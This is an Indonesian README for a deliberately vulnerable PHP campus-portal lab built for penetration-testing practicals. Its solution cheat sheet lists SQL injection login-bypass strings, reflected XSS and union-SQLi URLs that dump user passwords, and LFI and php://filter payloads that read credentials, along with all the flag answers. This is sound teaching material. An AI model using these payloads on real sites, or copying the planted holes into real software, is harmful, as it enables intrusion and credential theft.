# 🏛️ Portal Informasi Akademik - Teknik Informatika (VulnLab-PHP v1.2)

Aplikasi web portal kampus / jurusan yang tampak seperti **website normal dan profesional** (*Portal Berita, Layanan Akademik, dan Manajemen Laboratorium Teknik Informatika*). Di balik antarmuka yang realistis, aplikasi ini sengaja ditanami celah keamanan standar untuk keperluan praktikum **Network Penetration Testing (NPT)** dan pengujian keamanan siber.

Aplikasi dibangun menggunakan **PHP Native** murni dan basis data **MySQL**, tanpa framework berat, serta berstruktur file datar (*flat*) sehingga dapat langsung diunggah ke folder `htdocs` pada layanan shared hosting gratis seperti **InfinityFree**.

---

## 📂 Struktur Berkas (Flat di Root)

```text
htdocs/
├── config.php               # Konfigurasi koneksi MySQL & Custom HTTP Header
├── database.sql             # Skema & dump database (tabel users & posts berita)
├── header.php               # Template header, navbar resmi portal kampus, & stylesheet
├── footer.php               # Template footer & status diagnostik server
├── index.php                # Beranda portal (berita terkini, layanan, & widget server)
├── login.php                # Portal masuk staf/dosen (rentan SQL Injection Bypass)
├── dashboard.php            # Dashboard civitas/admin (menampilkan FLAG utama)
├── logout.php               # Skrip keluar sesi otentikasi
├── search.php               # Arsip pencarian berita (rentan Reflected XSS & Union SQLi)
├── view.php                 # Pusat dokumen (rentan Local File Inclusion / LFI)
├── panduan_layanan.txt      # Berkas dokumen standar operasional akademik
├── tentang_kami.txt         # Berkas profil visi & misi program studi
├── standar_laboratorium.txt # Berkas tata tertib penggunaan laboratorium
├── robots.txt               # Pengaturan sitemap mesin pencari (fuzzing discovery)
├── backup-config.txt        # Berkas cadangan konfigurasi dummy yang terekspos
├── secret-notes.txt         # Memo rahasia admin (target eksploitasi LFI)
└── README.md                # Panduan instalasi hosting & solusi praktikum
```

---

## 🚀 Panduan Deployment ke InfinityFree

Berikut langkah mudah mempublikasikan portal target ke hosting gratis **InfinityFree**:

### Langkah 1: Buat Akun & Domain di InfinityFree
1. Daftar atau masuk ke [https://www.infinityfree.com](https://www.infinityfree.com).
2. Di dashboard, klik tombol **Create Account**.
3. Pilih **Free Subdomain** (contoh: `portal-ti.great-site.net`).
4. Tunggu beberapa detik hingga akun hosting aktif.

---

### Langkah 2: Buat Database MySQL di vPanel
1. Buka akun hosting Anda lalu klik tombol **Control Panel** (vPanel).
2. Cari bagian **Databases** dan klik menu **MySQL Databases**.
3. Masukkan nama database (misalnya: `tiportal`), lalu klik **Create Database**.
4. Catat informasi koneksi yang muncul di halaman tersebut:
   - **MySQL Hostname**: contoh: `sql300.infinityfree.com`
   - **MySQL Username**: contoh: `if0_38000000`
   - **MySQL Password**: *(Password akun hosting vPanel Anda)*
   - **MySQL Database Name**: contoh: `if0_38000000_tiportal`

---

### Langkah 3: Import `database.sql` di phpMyAdmin
1. Di halaman MySQL Databases vPanel, klik tombol **phpMyAdmin** pada database yang baru dibuat.
2. Klik nama database Anda pada panel sebelah kiri phpMyAdmin.
3. Klik tab **Import** pada menu atas.
4. Klik **Choose File** / **Browse** lalu pilih file `database.sql`.
5. Klik tombol **Go** / **Kirim** di bagian bawah.
6. Pastikan tabel `users` dan `posts` berhasil terbuat dengan centang hijau.

---

### Langkah 4: Sesuaikan Berkas `config.php`
Buka berkas `config.php` dengan editor teks, sesuaikan 4 variabel database dengan data dari Langkah 2:

```php
$db_host = "sql300.infinityfree.com";      // Host MySQL dari vPanel
$db_user = "if0_38000000";                // Username MySQL dari vPanel
$db_pass = "PasswordHostingAnda";         // Password akun vPanel InfinityFree
$db_name = "if0_38000000_tiportal";       // Nama database MySQL lengkap
```

---

### Langkah 5: Unggah Semua Berkas ke Folder `htdocs`
1. Di vPanel InfinityFree, klik **Online File Manager** (atau gunakan **FileZilla** dengan host `ftpupload.net`, port 21).
2. Masuk ke dalam folder **`htdocs`**.
3. Hapus berkas bawaan seperti `default2.html` atau `index2.html`.
4. Unggah seluruh isi file proyek ini langsung ke dalam folder `htdocs`.
5. Buka domain Anda di browser (`http://portal-ti.great-site.net/`).

---

## 🎯 Panduan & Kunci Eksploitasi Praktikum (Cheat Sheet)

### 1. HTTP Service Discovery & Banner Grabbing
Server mengirimkan custom response header yang dapat divalidasi mahasiswa:
```bash
# Validasi Header dengan cURL
curl -I http://portal-ti.great-site.net/

# Service Detection dengan Nmap
nmap -sV -sC -p 80,443 portal-ti.great-site.net
```
**Temuan**:
- Header: `X-Lab-Version: VulnLab-PHP/1.2`
- Header: `X-Target-Server: NPT-Lab-Teknik-Informatika`

---

### 2. Information Disclosure & Enumerasi File (Robots & Backup)
```bash
gobuster dir -u http://portal-ti.great-site.net/ -w /usr/share/wordlists/dirb/common.txt -x txt,php,sql
```
- Akses `robots.txt` &rarr; **Flag 1:** `FLAG{Robots_Txt_Discovery_Success_8841}`
- Akses `backup-config.txt` &rarr; **Flag 2:** `FLAG{Sensitive_Backup_File_Exposed_4492}`

---

### 3. SQL Injection Authentication Bypass (Portal Masuk)
Halaman `login.php` memproses query langsung tanpa sanitasi:
`SELECT * FROM users WHERE username = '$username' AND password = '$password'`

- Buka `http://portal-ti.great-site.net/login.php`
- Masukkan Username: `' OR '1'='1` atau `admin' -- `
- Password: *(kosongkan atau isi sembarang)*
- Klik **Masuk ke Akun** &rarr; Berhasil masuk ke `dashboard.php`
- **Flag 3:** `FLAG{SQL_Injection_Success}`

---

### 4. Reflected XSS & Union-based SQL Injection (Pencarian Berita)
Halaman `search.php` memiliki dua kerentanan:

**A. Reflected XSS:**
Parameter `?q=` dicetak langsung tanpa sanitasi HTML:
```text
http://portal-ti.great-site.net/search.php?q=<script>alert('FLAG{Reflected_XSS_Success}')</script>
```

**B. Union-based SQL Injection:**
Tabel `posts` memiliki 5 kolom `(id, title, category, content, author)`:
```text
http://portal-ti.great-site.net/search.php?q=%27+UNION+SELECT+1%2C+username%2C+role%2C+flag%2C+password+FROM+users+--+
```
Data seluruh akun dan password dosen/admin akan tampil menyerupai artikel pengumuman!

---

### 5. Local File Inclusion (Pusat Dokumen)
Halaman `view.php` menggunakan fungsi `include($_GET['page'])`:

**A. Membaca Memo Rahasia:**
```text
http://portal-ti.great-site.net/view.php?page=secret-notes.txt
```
**Flag 4:** `FLAG{Local_File_Inclusion_Bypass_Master_1029}`

**B. Source Code Disclosure via PHP Wrapper:**
```text
http://portal-ti.great-site.net/view.php?page=php://filter/convert.base64-encode/resource=config.php
```
Decode base64 di terminal untuk membaca kredensial database asli:
```bash
echo "STRING_BASE64" | base64 -d
```

---

## 🚩 Rekapitulasi String FLAG Praktikum

| No | Modul Tantangan | Lokasi / File | String FLAG |
|---|---|---|---|
| 1 | Web Content Enumeration | `robots.txt` | `FLAG{Robots_Txt_Discovery_Success_8841}` |
| 2 | Sensitive File Exposure | `backup-config.txt` | `FLAG{Sensitive_Backup_File_Exposed_4492}` |
| 3 | SQL Injection Login Bypass | `login.php` &rarr; `dashboard.php` | `FLAG{SQL_Injection_Success}` |
| 4 | SQLi Admin Data Exfil | Tabel `users` (id=1) | `FLAG{SQLi_Admin_Access_Unlocked_7731}` |
| 5 | Reflected XSS | `search.php?q=...` | `FLAG{Reflected_XSS_Success}` |
| 6 | Local File Inclusion (LFI) | `view.php?page=secret-notes.txt` | `FLAG{Local_File_Inclusion_Bypass_Master_1029}` |

---

## ⚖️ Disclaimer
Aplikasi ini ditujukan murni untuk keperluan akademik dan edukasi keamanan siber di lingkungan laboratorium terkontrol.
